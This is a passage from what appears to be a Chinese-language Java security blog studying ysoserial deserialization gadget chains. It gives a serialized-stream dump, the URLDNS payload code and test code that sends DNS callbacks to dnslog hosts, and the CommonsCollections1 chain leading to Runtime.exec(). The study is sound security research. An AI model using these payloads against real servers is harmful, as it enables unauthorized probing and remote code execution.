class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar SerializationDumper-v1.13.jar <span class="hljs-string">&quot;aced0005770f0144c29b6800000182736d1c688006737d00000002000f6a6176612e726d692e52656d6f7465001a6d796a6176617365632e52 4d49496e7465726661636544656d6f70787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c65720000000000000002020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e6963617374526566000931302e34342e372e35000004daee738cb6741502bf44c29b6800000182736d1c6880010178&quot;</span><br><br>STREAM_MAGIC - 0xac ed<br>STREAM_VERSION - 0x00 05<br>Contents<br>  TC_BLOCKDATA - 0x77<br>    Length - 15 - 0x0f<br>    Contents - 0x0144c29b6800000182736d1c688006<br>  TC_OBJECT - 0x73<br>    TC_PROXYCLASSDESC - 0x7d<br>      newHandle 0x00 7e 00 00<br>      Interface count - 2 - 0x00 00 00 02<br>      proxyInterfaceNames<br>        0:<br>          Length - 15 - 0x00 0f<br>          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465<br>        1:<br>          Length - 26 - 0x00 1a<br>          Value - myjavasec.RMIInterfaceDemo - 0x6d796a6176617365632e524d49496e7465726661636544656d6f<br>      classAnnotations<br>        TC_NULL - 0x70<br>        TC_ENDBLOCKDATA - 0x78<br>      superClassDesc<br>        TC_CLASSDESC - 0x72<br>          className<br>            Length - 23 - 0x00 17<br>            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879<br>          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb<br>          newHandle 0x00 7e 00 01<br>          classDescFlags - 0x02 - SC_SERIALIZABLE<br>          fieldCount - 1 - 0x00 01<br>          Fields<br>            0:<br>              Object - L - 0x4c<br>              fieldName<br>                Length - 1 - 0x00 01<br>                Value - h - 0x68<br>              className1<br>                TC_STRING - 0x74<br>                  newHandle 0x00 7e 00 02<br>                  Length - 37 - 0x00 25<br>                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b<br>          classAnnotations<br>            TC_NULL - 0x70<br>            TC_ENDBLOCKDATA - 0x78<br>          superClassDesc<br>            TC_NULL - 0x70<br>    newHandle 0x00 7e 00 03<br>    classdata<br>      java.lang.reflect.Proxy<br>        values<br>          h<br>            (object)<br>              TC_OBJECT - 0x73<br>                TC_CLASSDESC - 0x72<br>                  className<br>                    Length - 45 - 0x00 2d<br>                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572<br>                  serialVersionUID - 0x00 00 00 00 00 00 00 02<br>                  newHandle 0x00 7e 00 04<br>                  classDescFlags - 0x02 - SC_SERIALIZABLE<br>                  fieldCount - 0 - 0x00 00<br>                  classAnnotations<br>                    TC_NULL - 0x70<br>                    TC_ENDBLOCKDATA - 0x78<br>                  superClassDesc<br>                    TC_CLASSDESC - 0x72<br>                      className<br>                        Length - 28 - 0x00 1c<br>                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374<br>                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e<br>                      newHandle 0x00 7e 00 05<br>                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE<br>                      fieldCount - 0 - 0x00 00<br>                      classAnnotations<br>                        TC_NULL - 0x70<br>                        TC_ENDBLOCKDATA - 0x78<br>                      superClassDesc<br>                        TC_NULL - 0x70<br>                newHandle 0x00 7e 00 06<br>                classdata<br>                  java.rmi.server.RemoteObject<br>                    values<br>                    objectAnnotation<br>                      TC_BLOCKDATA - 0x77<br>                        Length - 50 - 0x32<br>                        Contents - 0x000a556e6963617374526566000931302e34342e372e35000004daee738cb6741502bf44c29b6800000182736d1c68800101<br>                      TC_ENDBLOCKDATA - 0x78<br>                  java.rmi.server.RemoteObjectInvocationHandler<br>                    values<br>      &lt;Dynamic Proxy Class&gt;<br></code></pre></td></tr></table></figure><p>其中一个<code>classAnnotations</code>是序列化<code>objectOutputStream.annotateClass()</code>中设置的，序列化后的数据要放自定义的数据，只需要重写这个方法；也就是说，分析序列化数据的时候，看到的<code>classAnnotations</code>就是<code>annotateClass</code>写入的数据</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gadget Java</title>
    <link href="/2023/03/15/Gadget%20Java/"/>
    <url>/2023/03/15/Gadget%20Java/</url>
    
    <content type="html"><![CDATA[<h1 id="Gadget-Java"><a href="#Gadget-Java" class="headerlink" title="Gadget Java"></a>Gadget Java</h1><p>基于 Chris Frohoff 工具，<a href="https://github.com/frohoff/ysoserial">ysoserial</a>研究系列的利用链，在<code>GeneratePayload</code>调用每一个链的<code>getObject</code>方法</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>作为 DNS 查询，URLDNS 不需要依赖第三方包，也不受 jdk 版本限制，常用于检测反序列化(在目标没有回显时探测)；不能命令执行，只能作为 DNS 请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>HashMap.readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>            <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>读取键值对并且<code>put</code>进<code>mapping</code>过程中，进行了<code>putVal</code>，对<code>key</code>进行了<code>hash</code>计算，进一步跟进<code>hash</code>方法发现，对<code>key</code>进行了<code>hashCode</code>的计算，这会触发一次 DNS 请求，这点可以验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://r5z2ag.ceye.io/&quot;</span>);<br><br>Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hc.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//hc.set(url,123);</span><br>hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br><span class="hljs-comment">//hc.set(url,-1);</span><br><br><span class="hljs-comment">//hc.set()的作用是在调用put方法前修改hashCode为其他数值，调用put方法后再将hashCode修改回来，避免发起DNS请求</span><br></code></pre></td></tr></table></figure><p>会缓存<code>hashCode</code>则可以换个 dnslog 平台进行验证</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png"></p><p><code>key.hashCode</code>中，<code>key</code>是可控的(来自<code>readObject</code>读取到的)，当然要满足条件<code>mappings &gt; 0</code>即序列化流不为空</p><p>那为什么会调用 URL，因为<code>HashMap.put(url,&#39;anything&#39;)</code>url 属于<code>java.net.URL</code>对象</p><p>那么跟进<code>key</code>对象即<code>java.net.URL</code>的<code>hashCode</code>方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png"></p><p>第一个条件肯定跳过了，<code>handler</code>是<code>URLStreamHandler</code>的实例(上面有定义)，跟进发现根据协议<code>InetAddress addr = getHostAddress(u)</code>，进一步<code>u.hostAddress = InetAddress.getByName(host)</code>也就是根据域名查询 ip 即一次 DNS 请求</p><p>至此，整个利用链也很明显</p><blockquote><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">getByName:<span class="hljs-number">1077</span>, InetAddress (java.net)<br>getHostAddress:<span class="hljs-number">442</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">359</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">885</span>, URL (java.net)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>main:<span class="hljs-number">19</span>, Test (ysoserial)<br><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>readObject()<br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>hash()<br>URL-&gt;hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br>I<span class="hljs-function"><span class="hljs-title">netAddress</span>-&gt;</span>getByName()<br>上面的调用栈是ysoserial导出来的，重写了SilentURLStreamHandler，因此略微有些不同<br></code></pre></td></tr></table></figure></blockquote><p>序列化并输出文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://ir2jn4.dnslog.cn/&quot;</span>);<br><br>        Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hc.setAccessible(<span class="hljs-keyword">true</span>);<br>        hc.set(url,<span class="hljs-number">123</span>);<br>        hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br>        hc.set(url,-<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//输出到文件</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectOutputStream outputStream1 = <span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);<br>            outputStream1.writeObject(hm);<br>            outputStream.close();<br>            outputStream1.close();<br>            FileInputStream inputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            objectInputStream.readObject();<br>            objectInputStream.close();<br>            inputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对生成的文件进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeA</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\javasec\\ysoserial-master\\2.ser&quot;</span>)));<br>            ois.readObject();<br>            ois.close();<br>            System.out.println(<span class="hljs-string">&quot;URLDNS is cached&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>触发基本都很稳定，但是再一次反序列化就不会被 dnslog 记录到，换一个平台则又可以，暂时不清楚是否与缓存有关</p></blockquote><p>上边是利用了反射修改属性的方式，再看看一开始展示 ysoserial 的生成 Payload</p><p>在<code>GeneratePayload</code>调用 URLDNS 对象中的<code>getObject</code>方法：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getHostAddress:</span><span class="hljs-number">84</span>, URLDNS<span class="hljs-number">$SilentURLStreamHandler</span> (ysoserial.payloads) //空实现，不请求DNS<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">359</span>, URLStreamHandler (java.net)<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">885</span>, URL (java.net)<br><span class="hljs-symbol">hash:</span><span class="hljs-number">339</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">612</span>, HashMap (java.util)<br><span class="hljs-symbol">getObject:</span><span class="hljs-number">57</span>, URLDNS (ysoserial.payloads)<br><span class="hljs-symbol">main:</span><span class="hljs-number">34</span>, GeneratePayload (ysoserial)<br></code></pre></td></tr></table></figure><p>调用继承子类的重写方法<code>SilentURLStreamHandler.getHostAddress</code>，返回了 null 值，因此不触发 DNS 请求(其中序列化时 handler 是<strong>transient</strong>修饰的，因此不会存储在序列化数据中；而反序列化调用的时默认的 handler，也没有重写的<code>getHostAddress</code>方法，也就不影响进行 DNS 请求)</p><p>另外还重写了<code>openConnection</code>是因为继承的<code>URLStreamHandler</code>是抽象类，因此必须重写所有(也就一个)抽象方法</p><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk1.7 &lt; 8u71</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="关键类"><a href="#关键类" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 